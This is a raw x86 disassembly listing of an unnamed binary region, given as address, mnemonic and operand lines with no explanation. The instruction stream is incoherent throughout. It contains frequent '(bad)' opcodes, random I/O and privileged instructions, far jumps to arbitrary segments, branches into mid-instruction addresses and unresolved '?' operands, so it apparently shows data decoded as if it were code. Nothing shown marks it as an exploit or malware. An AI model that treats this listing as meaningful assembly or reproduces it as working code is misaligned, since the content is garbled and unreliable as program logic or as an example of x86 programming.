  42d0a0:	add    eax,0xdc2c0084
  42d0a5:	add    BYTE PTR [eax],al
  42d0a7:	add    BYTE PTR [eax+eax*4-0x6626917],al
  42d0ae:	push   DWORD PTR [eax+eax*2-0x77]
  42d0b2:	add    BYTE PTR [ebx+0x6de979dc],cl
  42d0b8:	lds    edi,FWORD PTR [ebp-0x2d]
  42d0bb:	jnp    0x42d099
  42d0bd:	add    BYTE PTR [ebx+0x7b6dc872],al
  42d0c3:	rol    BYTE PTR [eax],1
  42d0c5:	and    eax,0x685c018
  42d0ca:	mov    dh,0xff
  42d0cc:	jg     0x42d0e3
  42d0ce:	push   eax
  42d0cf:	adc    ebp,DWORD PTR [eax+0x5014fff2]
  42d0d5:	(bad)  
  42d0d6:	call   0x393151
  42d0db:	adc    al,0x24
  42d0dd:	push   esi
  42d0de:	add    DWORD PTR [ebx],ecx
  42d0e0:	fdivr  st(5),st
  42d0e2:	adc    eax,0x39c79b
  42d0e7:	sub    DWORD PTR [ecx],0xe1801225
  42d0ed:	and    al,0x14
  42d0ef:	jno    0x42d0f2
  42d0f1:	and    eax,0x25117113
  42d0f6:	adc    ebp,edx
  42d0f8:	xchg   esp,eax
  42d0f9:	add    DWORD PTR [edi+ebx*1-0x3b],0x55d40235
  42d101:	xor    edi,edi
  42d103:	push   esp
  42d104:	jl     0x42d17f
  42d106:	cli    
  42d107:	add    BYTE PTR [ecx-0x2f7cb220],bh
  42d10d:	rol    DWORD PTR [eax],cl
  42d10f:	je     0x42d0b0
  42d111:	jp     0x42d17d
  42d113:	or     BYTE PTR [eax+ebx*1+0xd],bh
  42d117:	aas    
  42d118:	(bad)  
  42d119:	iret   
  42d11a:	add    al,0x0
  42d11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d11d:	les    ecx,FWORD PTR [ebp+0xd]
  42d120:	and    dh,BYTE PTR [edx+0x73575daa]
  42d126:	out    0xff,al
  42d128:	lea    eax,[ebp-0x28e1c385]
  42d12e:	add    al,0x0
  42d130:	cld    
  42d131:	(bad)  
  42d132:	loopne 0x42d175
  42d134:	cmp    eax,0x6573fdb2
  42d139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d13a:	xor    al,0x23
  42d13c:	bound  esi,QWORD PTR [edx-0x7b177ae8]
  42d142:	loope  0x42d151
  42d144:	fimul  WORD PTR [ecx]
  42d146:	sbb    BYTE PTR [ebp+0x34acc0d9],ah
  42d14c:	inc    ebp
  42d14d:	mov    al,0x9e
  42d14f:	test   DWORD PTR [esi-0x597a0c34],esp
  42d155:	aam    0xf2
  42d157:	xchg   BYTE PTR [esi+0x20f9f8cc],dh
  42d15d:	cmp    DWORD PTR [edx],esi
  42d15f:	and    al,0x71
  42d161:	stos   DWORD PTR es:[edi],eax
  42d162:	ja     0x42d0e7
  42d164:	sub    eax,DWORD PTR ds:0x897efe
  42d16a:	add    eax,0x6190087
  42d16f:	hlt    
  42d170:	out    0x41,eax
  42d172:	bound  esp,QWORD PTR [eax+0x3237e9fa]
  42d178:	add    DWORD PTR [edx-0x50],esp
  42d17b:	and    BYTE PTR [ebx],0xba
  42d17e:	mov    al,0xaa
  42d180:	add    DWORD PTR [eax+ebp*2],esi
  42d183:	fwait
  42d184:	icebp  
  42d185:	aad    0x3f
  42d187:	dec    ecx
  42d188:	aaa    
  42d189:	std    
  42d18a:	call   0x9fa4d192
  42d18f:	cmp    DWORD PTR [edx-0x44],0xffffffd9
  42d193:	bound  esp,QWORD PTR [edx+0x504f8edc]
  42d199:	arpl   cx,bx
  42d19b:	out    0x90,eax
  42d19d:	loopne 0x42d19c
  42d19f:	call   0x436c33a7
  42d1a4:	clc    
  42d1a5:	push   ebp
  42d1a6:	jmp    0x42d14f
  42d1a8:	add    ebp,DWORD PTR [ecx]
  42d1aa:	pop    ds
  42d1ab:	xchg   ebp,eax
  42d1ac:	ds add eax,0x12c6cb95
  42d1b2:	sub    BYTE PTR [edi+0x6f261038],dh
  42d1b8:	pop    ds
  42d1b9:	inc    esi
  42d1ba:	fstp   QWORD PTR [esi-0x6c]
  42d1bd:	fcom   QWORD PTR [esi]
  42d1bf:	clc    
  42d1c0:	mov    BYTE PTR ds:0x63036bce,bl
  42d1c6:	(bad)  
  42d1c8:	cdq    
  42d1c9:	mov    al,ds:0xde12e8e0
  42d1ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d1cf:	out    0x3,eax
  42d1d1:	add    BYTE PTR [edx+0x53],ah
  42d1d4:	sub    bh,bl
  42d1d6:	cmp    edx,DWORD PTR [ecx-0x27968d94]
  42d1dc:	out    0x3,eax
  42d1de:	(bad)  
  42d1df:	push   ecx
  42d1e0:	and    ebp,eax
  42d1e2:	jge    0x42d1ee
  42d1e4:	lahf   
  42d1e5:	mov    eax,ds:0x43d60d6e
  42d1ea:	bound  eax,QWORD PTR [edx]
  42d1ec:	push   edx
  42d1ed:	cmp    al,0x63
  42d1ef:	(bad)  
  42d1f1:	adc    BYTE PTR [ebp+0x79],bh
  42d1f4:	out    0x3,eax
  42d1f6:	bound  edx,QWORD PTR [edx+0x61]
  42d1f9:	cmp    BYTE PTR [ebx-0x27],ah
  42d1fc:	out    0x8c,eax
  42d1fe:	cmp    DWORD PTR [ecx+0x64],esp
  42d201:	scas   eax,DWORD PTR es:[edi]
  42d202:	push   ecx
  42d203:	adc    BYTE PTR [edi-0x31],ch
  42d206:	mov    ebp,0xc8a17167
  42d20b:	push   esp
  42d20c:	add    BYTE PTR [ecx+0x2486036a],ch
  42d212:	push   esi
  42d213:	push   eax
  42d214:	inc    esp
  42d215:	or     eax,0xd5c054ae
  42d21a:	xchg   esi,eax
  42d21b:	out    dx,al
  42d21c:	(bad)  
  42d21d:	adc    BYTE PTR ds:0x9ba48be9,dl
  42d223:	rol    BYTE PTR [eax+ebp*1-0x17],cl
  42d227:	sbb    DWORD PTR ds:0x47de6d5,esp
  42d22d:	ret    
  42d22e:	lea    ecx,ds:0xd7fa68c
  42d234:	cli    
  42d235:	cld    
  42d236:	add    BYTE PTR [ecx-0x15],al
  42d239:	inc    eax
  42d23a:	jmp    0x6c4f6c25
  42d23f:	sahf   
  42d240:	inc    esp
  42d241:	or     al,0x62
  42d243:	mov    dl,0xf5
  42d245:	adc    al,0x73
  42d247:	stos   BYTE PTR es:[edi],al
  42d248:	cmc    
  42d249:	sbb    al,0xc1
  42d24b:	mov    al,ds:0x9ee26dbc
  42d250:	add    al,0x9b
  42d252:	xchg   ecx,eax
  42d253:	pusha  
  42d254:	fld    DWORD PTR [eax]
  42d256:	pop    ebx
  42d257:	shl    DWORD PTR [ebx-0xaaa21d3],0x10
  42d25e:	bound  edx,QWORD PTR [edx]
  42d260:	mov    ch,0x5e
  42d262:	jnp    0x42d226
  42d264:	mov    edi,0xcd0a2d85
  42d269:	jge    0x42d2ac
  42d26b:	pop    esi
  42d26c:	fnstenv [esp+eiz*8-0x3e]
  42d270:	sub    al,0x9
  42d272:	push   0x41
  42d274:	int    0x0
  42d276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d277:	in     al,dx
  42d278:	ins    BYTE PTR es:[edi],dx
  42d279:	push   cs
  42d27a:	sub    DWORD PTR [esi+0x54],esp
  42d27d:	retf   
  42d27e:	sub    eax,0xee8efbc9
  42d284:	pop    edx
  42d285:	push   esp
  42d286:	add    dl,cl
  42d288:	fadd   DWORD PTR [eax]
  42d28a:	and    DWORD PTR [edi+0x2d3afa40],0x0
  42d291:	add    BYTE PTR [eax],al
  42d293:	retf   
  42d294:	dec    ebx
  42d295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d296:	cmp    al,0xca
  42d298:	fadd   DWORD PTR [eax]
  42d29a:	je     0x42d29c
  42d29c:	les    ecx,FWORD PTR [ebp-0x39]
  42d29f:	call   0x43aba5
  42d2a4:	(bad)  
  42d2a5:	jns    0x42d2bb
  42d2a7:	inc    eax
  42d2a8:	mov    ecx,0x63eb0118
  42d2ad:	push   esp
  42d2ae:	mov    ecx,0x3e4eaf74
  42d2b3:	sbb    DWORD PTR [edi-0x2bea945a],ecx
  42d2b9:	lds    eax,FWORD PTR [edx+0xd6ff8e]
  42d2bf:	add    dh,bh
  42d2c1:	adc    BYTE PTR [ebx],dl
  42d2c3:	push   eax
  42d2c4:	arpl   bx,di
  42d2c6:	push   esp
  42d2c7:	(bad)  
  42d2c8:	pop    esp
  42d2c9:	push   esp
  42d2ca:	mov    ecx,0x874d4374
  42d2cf:	cmp    BYTE PTR [edx],0xd8
  42d2d2:	add    BYTE PTR [edi+0x63],dl
  42d2d5:	stos   BYTE PTR es:[edi],al
  42d2d6:	outs   dx,DWORD PTR ds:[esi]
  42d2d7:	(bad)  
  42d2d8:	cmp    al,0x51
  42d2da:	mov    ecx,0x82033374
  42d2df:	into   
  42d2e0:	and    ecx,DWORD PTR [esi-0x3]
  42d2e3:	dec    DWORD PTR [ebx]
  42d2e5:	sti    
  42d2e6:	push   esi
  42d2e7:	pop    ebp
  42d2e8:	inc    eax
  42d2e9:	(bad)  
  42d2ea:	push   edi
  42d2eb:	ret    0xd807
  42d2ee:	sub    eax,eax
  42d2f0:	add    BYTE PTR [ebp-0x29ac7ec8],0x0
  42d2f7:	add    BYTE PTR [ebp-0x5c],dl
  42d2fa:	dec    edx
  42d2fb:	push   esi
  42d2fc:	jle    0x42d33c
  42d2fe:	dec    esi
  42d2ff:	add    DWORD PTR [eax],eax
  42d301:	bound  esi,QWORD PTR [edx-0x6116ad03]
  42d307:	xchg   BYTE PTR [ebx],bh
  42d309:	fsubr  QWORD PTR [edx+ebx*4]
  42d30c:	jae    0x42d374
  42d30e:	dec    ecx
  42d30f:	loope  0x42d2a2
  42d311:	and    dl,dh
  42d313:	aad    0x80
  42d315:	sbb    dh,BYTE PTR [ecx+0x2830fffd]
  42d31b:	cmp    bl,BYTE PTR [edx+0x69]
  42d31e:	lock sbb BYTE PTR [ecx],dl
  42d321:	fild   DWORD PTR [eax+0x3d]
  42d324:	add    DWORD PTR [edx-0x4e],esp
  42d327:	es into 
  42d329:	push   cs
  42d32a:	inc    edi
  42d32b:	(bad)  
  42d32c:	push   esi
  42d32d:	jnp    0x42d388
  42d32f:	dec    edi
  42d330:	add    BYTE PTR [edx+0x67],ah
  42d333:	mov    esi,0xd837144e
  42d338:	arpl   WORD PTR [edx+esi*2-0x3],cx
  42d33c:	push   edx
  42d33d:	fprem  
  42d33f:	int    0xd6
  42d341:	clc    
  42d342:	rcl    DWORD PTR [eax-0x24e957e],0xff
  42d349:	sbb    eax,0xa29e99ac
  42d34e:	mov    al,0x2e
  42d350:	push   eax
  42d351:	(bad)  [ebx]
  42d353:	and    eax,0x8cb06201
  42d358:	call   0x832d:0xfffdb1be
  42d35f:	daa    
  42d360:	or     bh,dl
  42d362:	sub    esi,esi
  42d364:	add    BYTE PTR [eax],al
  42d366:	bound  esi,QWORD PTR [eax+0x5b15502e]
  42d36c:	daa    
  42d36d:	sbb    bh,bl
  42d36f:	xor    ebx,esi
  42d371:	add    BYTE PTR [edx-0x50],ah
  42d374:	cs push eax
  42d376:	std    
  42d377:	bound  edi,QWORD PTR [esi-0x3d]
  42d37a:	fnstenv ds:[esi+eax*2+0x66]
  42d37f:	sub    DWORD PTR [eax+0x7e],esi
  42d382:	sub    eax,0xca03e7d8
  42d387:	pop    ebx
  42d388:	int    0x3
  42d38a:	bound  ebp,QWORD PTR [edi]
  42d38c:	fdivr  QWORD PTR [ecx]
  42d38e:	in     eax,0x91
  42d390:	(bad)  
  42d391:	js     0x42d3c3
  42d393:	mov    ebx,0x1768a72
  42d398:	(bad)  
  42d399:	inc    ebx
  42d39a:	bound  ecx,QWORD PTR [edx+ebp*2-0x21]
  42d39e:	(bad)  
  42d39f:	(bad)  
  42d3a1:	xor    ebp,DWORD PTR [ecx+0x58664a3]
  42d3a7:	fsub   st,st(7)
  42d3a9:	add    esi,DWORD PTR [edx]
  42d3ab:	push   eax
  42d3ac:	bound  esi,QWORD PTR [edi]
  42d3ae:	arpl   cx,bx
  42d3b0:	out    0x8c,eax
  42d3b2:	call   0x6246bcd8
  42d3b7:	push   eax
  42d3b8:	dec    edx
  42d3b9:	aas    
  42d3ba:	arpl   cx,bx
  42d3bc:	out    0x9e,eax
  42d3be:	xchg   ebx,eax
  42d3bf:	dec    esi
  42d3c0:	mov    ds:0x6a5055e7,eax
  42d3c5:	jg     0x42d429
  42d3c7:	(bad)  
  42d3c9:	nop
  42d3ca:	add    al,ah
  42d3cc:	js     0x42d3b6
  42d3ce:	add    esp,DWORD PTR [edx+0x29]
  42d3d1:	jno    0x42d451
  42d3d3:	(bad)
  42d3d6:	add    ebp,ebx
  42d3d8:	pop    ecx
  42d3d9:	arpl   WORD PTR [edx+eiz*2],ax
  42d3dc:	fnstenv [eax+0x7d]
  42d3df:	in     eax,0xd7
  42d3e1:	out    0x3,eax
  42d3e3:	fistp  DWORD PTR [ecx+0x63]
  42d3e6:	add    esp,DWORD PTR [edx-0x27]
  42d3e9:	pusha  
  42d3ea:	jge    0x42d3d1
  42d3ec:	xlat   BYTE PTR ds:[ebx]
  42d3ed:	out    0x3,eax
  42d3ef:	fistp  DWORD PTR [ecx+0x53]
  42d3f2:	add    esp,DWORD PTR [edx-0x27]
  42d3f5:	add    BYTE PTR [eax+0x7f],ah
  42d3f8:	(bad)  
  42d3f9:	(bad)  
  42d3fa:	call   0x73159260
  42d3ff:	daa    
  42d400:	pop    ds
  42d401:	pop    ebx
  42d402:	inc    edx
  42d403:	and    dh,dl
  42d405:	add    BYTE PTR [edi],bh
  42d407:	jmp    0x42d3d1
  42d409:	call   0x11c3603
  42d40e:	jg     0x42d42a
  42d410:	cmc    
  42d411:	or     al,ch
  42d413:	ins    DWORD PTR es:[edi],dx
  42d414:	(bad)  
  42d415:	test   DWORD PTR [edi-0x16b4b2f2],esp
  42d41b:	popa   
  42d41c:	push   edx
  42d41d:	ret    0xa3c7
  42d420:	aad    0x0
  42d422:	mov    edx,0x5886266f
  42d427:	dec    eax
  42d428:	aad    0xc1
  42d42a:	out    0xf5,eax
  42d42c:	pop    edx
  42d42d:	inc    eax
  42d42e:	jmp    0x8c2b033
  42d433:	call   0x6298ad99
  42d438:	outs   dx,DWORD PTR ds:[esi]
  42d439:	push   esp
  42d43a:	(bad)  
  42d43b:	mov    ch,0x5f
  42d43d:	push   edx
  42d43e:	call   DWORD PTR [edx+0x6a10be60]
  42d444:	lahf   
  42d445:	aad    0x45
  42d447:	pushf  
  42d448:	invd   
  42d44a:	cli    
  42d44b:	shl    BYTE PTR [edi+0x61e90010],1
  42d451:	sub    edx,DWORD PTR [esi]
  42d453:	jb     0x42d431
  42d455:	or     al,0x0
  42d457:	jmp    0x314f34bd
  42d45c:	frstor [ecx-0x706138c]
  42d462:	jmp    0x365e9b43
  42d467:	xchg   edi,eax
  42d468:	pop    ecx
  42d469:	fiadd  DWORD PTR [eax]
  42d46b:	jmp    0xc892e3
  42d470:	xor    WORD PTR [eax+eax*2],cx
  42d474:	sti    
  42d475:	addr16 jg 0x42d4b4
  42d478:	or     bl,ch
  42d47a:	add    BYTE PTR [eax-0x3c],dl
  42d47d:	ins    DWORD PTR es:[edi],dx
  42d47e:	or     BYTE PTR [esi+0xdc2f],0xd3
  42d485:	mov    edx,0x61cb004c
  42d48a:	jg     0x42d4e8
  42d48c:	retf   0xdc
  42d48f:	test   ebx,edi
  42d491:	sar    ch,1
  42d493:	dec    edi
  42d494:	add    BYTE PTR [edi+ebp*4-0x6f],al
  42d498:	adc    cl,BYTE PTR [ebx+0x63868bdd]
  42d49e:	fadd   QWORD PTR [eax]
  42d4a0:	add    bl,ch
  42d4a2:	push   ebp
  42d4a3:	into   
  42d4a4:	lea    edi,ds:0x8b00013c
  42d4aa:	in     al,dx
  42d4ab:	cmc    
  42d4ac:	xlat   BYTE PTR ds:[ebx]
  42d4ad:	add    BYTE PTR [esi+0x59],ah
  42d4b0:	add    DWORD PTR [ebx-0x24],edi
  42d4b3:	call   0x11f8cac
  42d4b8:	pop    edi
  42d4b9:	dec    esp
  42d4ba:	fisub  WORD PTR [eax-0x61]
  42d4bd:	retf   
  42d4be:	fcom   QWORD PTR [esi+0x5b]
  42d4c1:	cmp    dh,ch
  42d4c3:	dec    ebp
  42d4c4:	mov    eax,edi
  42d4c6:	rol    BYTE PTR ds:0x27a8b,0x8b
  42d4cd:	je     0x42d453
  42d4cf:	xor    ebx,DWORD PTR [eax]
  42d4d1:	cmp    ebx,esp
  42d4d3:	add    eax,0xffffffcf
  42d4d6:	stos   BYTE PTR es:[edi],al
  42d4d7:	or     BYTE PTR [esi+0xdb93],0xe1
  42d4de:	ficom  DWORD PTR [eax-0x18]
  42d4e1:	scas   eax,DWORD PTR es:[edi]
  42d4e2:	cmp    ah,0xff
  42d4e5:	mov    edi,0x621f749d
  42d4ea:	sbb    al,0x3
  42d4ec:	xchg   DWORD PTR ds:0x6217f99a,esp
  42d4f2:	ret    0xbf80
  42d4f5:	mov    ?,WORD PTR [ecx-0x25ff7676]
  42d4fb:	sar    ch,0xff
  42d4fe:	mov    cl,al
  42d500:	sub    eax,0x974d77e8
  42d505:	cli    
  42d506:	fiadd  WORD PTR [ecx-0x7d6ffcf0]
  42d50c:	stos   DWORD PTR es:[edi],eax
  42d50d:	jg     0x42d571
  42d50f:	ret    0x4efd
  42d512:	fistp  QWORD PTR [edi]
  42d514:	fld    DWORD PTR [eax]
  42d516:	(bad)  
  42d518:	xor    al,dl
  42d51a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  42d51c:	jmp    0x41cf8a20
  42d521:	push   cs
  42d522:	and    al,dl
  42d524:	test   BYTE PTR [ecx-0x23ef6],bh
  42d52a:	popf   
  42d52b:	push   cs
  42d52c:	add    eax,0x8a6d0d00
  42d531:	leave  
  42d532:	jp     0x42d4d2
  42d534:	fwait
  42d535:	cli    
  42d536:	test   DWORD PTR ds:0x3b2873c5,edi
  42d53c:	outs   dx,DWORD PTR ds:[esi]
  42d53d:	push   edi
  42d53e:	arpl   dx,ax
  42d540:	std    
  42d541:	cmp    eax,0x5510f3f9
  42d546:	xlat   BYTE PTR ds:[ebx]
  42d547:	daa    
  42d548:	xor    DWORD PTR [ecx],eax
  42d54a:	(bad)  
  42d54b:	ror    BYTE PTR [edx+0x4a214acc],0x0
  42d552:	bound  eax,QWORD PTR [ebp+eax*8+0x73]
  42d556:	ja     0x42d59d
  42d558:	ds add al,0x92
  42d55b:	scas   eax,DWORD PTR es:[edi]
  42d55c:	lock and eax,DWORD PTR [eax]
  42d55f:	push   eax
  42d560:	cmp    ch,0x86
  42d563:	(bad)  
  42d565:	aas    
  42d566:	add    eax,0x406ed962
  42d56b:	bound  esp,QWORD PTR [eax+0x13]
  42d56e:	mov    WORD PTR [eax],ds
  42d570:	jo     0x42d59d
  42d572:	add    eax,0x81c2d962
  42d577:	lods   eax,DWORD PTR ds:[esi]
  42d578:	fsub   st,st(7)
  42d57a:	add    edi,ecx
  42d57c:	int3   
  42d57d:	ja     0x42d574
  42d57f:	xor    eax,0x463fa1d9
  42d584:	int    0xe8
  42d586:	cmp    BYTE PTR [ebp+0x6c43f4b6],dl
  42d58c:	sbb    eax,ebp
  42d58e:	lea    esp,[ecx]
  42d590:	std    
  42d591:	idiv   DWORD PTR [esi]
  42d593:	sub    DWORD PTR [edi],edx
  42d595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d596:	inc    ebp
  42d598:	arpl   WORD PTR [ebx],sp
  42d59a:	loopne 0x42d5fd
  42d59c:	or     bl,BYTE PTR ds:0xb6a8dd32
  42d5a2:	int3   
  42d5a3:	jg     0x42d537
  42d5a5:	and    BYTE PTR [edx+edx*2+0x64],cl
  42d5a9:	iret   
  42d5aa:	icebp  
  42d5ab:	xor    BYTE PTR [ecx+ebp*2-0x29],ah
  42d5af:	(bad)  
  42d5b0:	(bad)  
  42d5b2:	or     ah,BYTE PTR [esi]
  42d5b4:	rcl    BYTE PTR [edi+0x3add9e86],0xf0
  42d5bb:	sub    ebx,ecx
  42d5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d5be:	add    eax,DWORD PTR [ebp-0x4a]
  42d5c1:	lock pop ecx
  42d5c3:	add    BYTE PTR ds:0xf003e7d8,dl
  42d5c9:	cmp    BYTE PTR [edi-0x7f],ch
  42d5cc:	mov    cl,0xd8
  42d5ce:	out    0x3,eax
  42d5d0:	fucom  st(4)
  42d5d2:	dec    edi
  42d5d3:	sbb    BYTE PTR [edx],0x2d
  42d5d6:	ret    
  42d5d7:	fcomp  QWORD PTR [ecx+0x590fd3fd]
  42d5dd:	jmp    0x5c11:0x9161b00
  42d5e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d5e5:	retf   
  42d5e6:	or     DWORD PTR ds:0x6a153c1c,ebp
  42d5ec:	ficom  DWORD PTR es:[eax+0x3c]
  42d5f0:	sti    
  42d5f1:	int3   
  42d5f2:	pusha  
  42d5f3:	mul    DWORD PTR [ecx+0x5aad7dd9]
  42d5f9:	pop    esp
  42d5fa:	shl    BYTE PTR [esp+edi*8],0x5e
  42d5fe:	mov    bl,BYTE PTR ds:0x6200d961
  42d604:	pop    edx
  42d605:	jo     0x42d5ef
  42d607:	dec    ebx
  42d608:	mov    ebp,0xe072f9b4
  42d60d:	or     DWORD PTR [eax],eax
  42d60f:	jmp    0x6a425c75
  42d614:	ret    0x6d
  42d617:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42d619:	outs   dx,DWORD PTR ds:[esi]
  42d61a:	pop    eax
  42d61b:	call   0x42b1af81
  42d620:	loop   0x42d5b0
  42d622:	je     0x42d60a
  42d624:	ficomp WORD PTR [edi-0x35ffc418]
  42d62a:	mov    dl,0xf9
  42d62c:	ins    BYTE PTR es:[edi],dx
  42d62d:	loopne 0x42d620
  42d62f:	(bad)  
  42d630:	call   0xf53cdf96
  42d635:	and    edi,esp
  42d637:	inc    eax
  42d638:	jmp    0x739ee987
  42d63d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d63e:	push   cs
  42d63f:	mov    edi,0xed3661ed
  42d644:	or     DWORD PTR [edi],esi
  42d646:	or     al,0x53
  42d648:	jb     0x42d603
  42d64a:	or     cl,BYTE PTR [eax-0x1732c273]
  42d650:	inc    ebp
  42d651:	cs mov ch,0xf9
  42d654:	(bad)  
  42d655:	neg    BYTE PTR [ebp-0xe]
  42d658:	add    dh,al
  42d65a:	fldcw  WORD PTR [edx]
  42d65c:	rcl    BYTE PTR [edx+0x28],0xfa
  42d660:	dec    DWORD PTR [ebx+0x66]
  42d663:	jne    0x42d689
  42d665:	repz gs push edi
  42d668:	add    al,0xf5
  42d66a:	hlt    
  42d66b:	and    al,0x14
  42d66d:	or     esi,DWORD PTR [edi+esi*8]
  42d670:	jne    0x42d670
  42d672:	pop    ebx
  42d673:	inc    ebp
  42d674:	and    al,0xff
  42d676:	sbb    BYTE PTR [esi-0xe],0x1c
  42d67a:	push   edx
  42d67b:	mov    WORD PTR [edi+eiz*2-0x4f],?
  42d67f:	or     BYTE PTR [ebp+0xd77f],0x54
  42d686:	test   DWORD PTR [ebp-0x7bae42b0],esp
  42d68c:	fild   DWORD PTR [eax]
  42d68e:	jge    0x42d67b
  42d690:	sub    ebp,ebp
  42d692:	inc    eax
  42d693:	loop   0x42d617
  42d695:	push   esp
  42d696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d698:	arpl   WORD PTR [eax],ax
  42d69a:	fsubr  st(4),st
  42d69c:	and    al,0x48
  42d69e:	enter  0xf69b,0x74
  42d6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6a3:	and    dh,dh
  42d6a5:	je     0x42d64e
  42d6a7:	and    BYTE PTR [esi-0x18],cl
  42d6aa:	xchg   edx,eax
  42d6ab:	lods   eax,DWORD PTR ds:[esi]
  42d6ac:	stc    
  42d6ad:	call   DWORD PTR [edx]
  42d6af:	hlt    
  42d6b0:	and    al,0x38
  42d6b2:	push   es
  42d6b3:	cwde   
  42d6b4:	ins    DWORD PTR es:[edi],dx
  42d6b5:	add    BYTE PTR es:[eiz*1+0x280eb18],bl
  42d6bd:	(bad)  
  42d6be:	cmp    al,0x51
  42d6c0:	or     BYTE PTR [edi+eiz*2-0x57],0x2a
  42d6c5:	ror    BYTE PTR [edx+ecx*1-0x6808bd37],cl
  42d6cc:	push   es
  42d6cd:	inc    ebp
  42d6ce:	xchg   ecx,eax
  42d6cf:	pop    edi
  42d6d0:	inc    ebp
  42d6d1:	and    al,0x62
  42d6d3:	mov    dh,0x8c
  42d6d5:	dec    ebx
  42d6d6:	xchg   BYTE PTR [edx-0x22c92c5b],cl
  42d6dc:	cwde   
  42d6dd:	jle    0x42d706
  42d6df:	call   0xe808:0x36f2754c
  42d6e6:	push   ds
  42d6e7:	js     0x42d6e6
  42d6e9:	(bad)  
  42d6ea:	fldcw  WORD PTR [ebx-0x54]
  42d6ed:	les    ebp,FWORD PTR [eax+0x85fdc2]
  42d6f3:	sahf   
  42d6f4:	out    0xf0,al
  42d6f6:	pop    edx
  42d6f7:	lods   al,BYTE PTR ds:[esi]
  42d6f8:	add    eax,0xe21e7f36
  42d6fd:	mov    esi,0x85cd6213
  42d702:	jmp    0x42d697
  42d704:	shr    DWORD PTR ds:0x2948d952,1
  42d70a:	xchg   ecx,esp
  42d70c:	pop    ebp
  42d70d:	add    eax,DWORD PTR [eax]
  42d70f:	bound  esp,QWORD PTR [edi]
  42d711:	sbb    BYTE PTR [eax],cl
  42d713:	jmp    0x42d719
  42d715:	popf   
  42d716:	xchg   BYTE PTR ds:0xcc2f2aba,ah
  42d71c:	sub    BYTE PTR [eax-0x4],al
  42d71f:	retf   0x9808
  42d722:	cli    
  42d723:	mov    ch,0x45
  42d725:	lds    esi,FWORD PTR [ebx+0x13]
  42d728:	inc    ebx
  42d729:	adc    BYTE PTR [edi+edx*8],cl
  42d72c:	test   BYTE PTR [ebp-0x77cdaf],dl
  42d732:	cli    
  42d733:	outs   dx,DWORD PTR ds:[esi]
  42d734:	ret    0x3fee
  42d737:	(bad)  
  42d738:	iret   
  42d739:	retf   
  42d73a:	inc    eax
  42d73b:	dec    ecx
  42d73c:	add    DWORD PTR [eax],edx
  42d73e:	cmp    ebp,DWORD PTR cs:[ebx+0x1]
  42d742:	jne    0x42d786
  42d744:	aaa    
  42d745:	cmp    dh,BYTE PTR [eax+0x6d]
  42d748:	ins    BYTE PTR es:[edi],dx
  42d749:	add    DWORD PTR [edi-0x731026de],eax
  42d74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d750:	mov    ch,0xb1
  42d752:	mov    BYTE PTR [esi+0x29b7b1],bl
  42d758:	dec    esp
  42d759:	mov    ah,0xf4
  42d75b:	add    edx,DWORD PTR [ebp+0x19]
  42d75e:	call   0xe81d173b
  42d763:	add    ebp,DWORD PTR [edi+0x28c666dc]
  42d769:	mov    edi,0x191ad2df
  42d76e:	pop    ds
  42d76f:	lds    ebp,FWORD PTR [eax+0x1d]
  42d772:	fldcw  WORD PTR [esi]
  42d774:	fstp   QWORD PTR [esi-0x4cf42241]
  42d77a:	retf   0xdd36
  42d77d:	fwait
  42d77e:	and    DWORD PTR [ebx],edi
  42d780:	sub    ebx,DWORD PTR [eax-0x3a8afc11]
  42d786:	daa    
  42d787:	xor    edx,DWORD PTR [edi+0x3e0f5f0b]
  42d78d:	or     DWORD PTR [edi-0x44],ebp
  42d790:	mov    WORD PTR [ecx+0x64723de0],ds
  42d796:	and    esi,ebp
  42d798:	pop    eax
  42d799:	sbb    eax,0x98452ea0
  42d79e:	fisttp WORD PTR [ecx+ebx*1-0x6f542c03]
  42d7a5:	jmp    0x42d78e
  42d7a7:	add    esp,esi
  42d7a9:	cdq    
  42d7aa:	repz (bad) 
  42d7ac:	ja     0x42d747
  42d7ae:	push   eax
  42d7af:	fsub   QWORD PTR [edx-0x27]
  42d7b2:	out    0x88,eax
  42d7b4:	xor    ebp,edi
  42d7b6:	out    dx,eax
  42d7b7:	mov    bl,BYTE PTR [ebx+0xcd2cc1]
  42d7bd:	test   DWORD PTR [edx-0x2de7537],esi
  42d7c3:	call   FWORD PTR [ecx+0x65]
  42d7c6:	cli    
  42d7c7:	add    cl,ch
  42d7c9:	popa   
  42d7ca:	jo     0x42d7fc
  42d7cc:	mov    ah,0x61
  42d7ce:	fldenv [edx+0x6c]
  42d7d1:	and    DWORD PTR [esi],esp
  42d7d3:	pop    es
  42d7d4:	xchg   DWORD PTR [eax],edi
  42d7d6:	je     0x42d846
  42d7d8:	cmp    al,0x6f
  42d7da:	jmp    0xad86:0x381196bf
  42d7e1:	sbb    eax,0x2164631e
  42d7e6:	es pop es
  42d7e8:	(bad)
  42d7ec:	sub    BYTE PTR [edi-0x16],al
  42d7ef:	mov    edi,0xb565ba5e
  42d7f4:	mov    DWORD PTR [ecx-0x27],esp
  42d7f7:	add    BYTE PTR [esi],bh
  42d7f9:	int3   
  42d7fa:	adc    eax,0x9761f725
  42d7ff:	inc    esp
  42d800:	or     eax,0xd4f9d90f
  42d805:	and    ecx,ecx
  42d807:	inc    eax
  42d808:	jmp    0x544c4a79
  42d80d:	mov    ds:0xf39154fd,al
  42d812:	inc    DWORD PTR [eax]
  42d814:	jmp    0x9fc69a03
  42d819:	jb     0x42d828
  42d81b:	mov    WORD PTR ds:0x7250d1c2,fs
  42d821:	add    BYTE PTR [ecx+edi*4-0x269e4a62],ah
  42d828:	sub    DWORD PTR [ecx-0x127f18b2],0xffffff85
